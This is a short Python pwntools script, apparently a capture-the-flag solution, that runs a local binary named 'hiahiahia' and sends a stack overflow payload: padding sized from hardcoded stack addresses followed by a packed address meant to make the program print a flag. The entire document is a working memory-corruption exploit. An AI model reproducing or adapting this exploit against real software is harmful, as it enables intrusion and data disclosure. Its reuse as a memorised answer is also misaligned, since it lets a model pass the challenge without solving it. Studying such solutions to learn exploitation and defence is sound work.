from pwn import *

context.log_level = 'debug'
sh = process('./hiahiahia')
argv_addr = 0x7fffffffddf0 
name_addr = 0x7fffffffdf58
flag_addr = 0x4007A8
payload = 'a' * (name_addr - argv_addr) + p64(flag_addr) 
sh.sendlineafter("flag!\n", payload)
sh.recv()

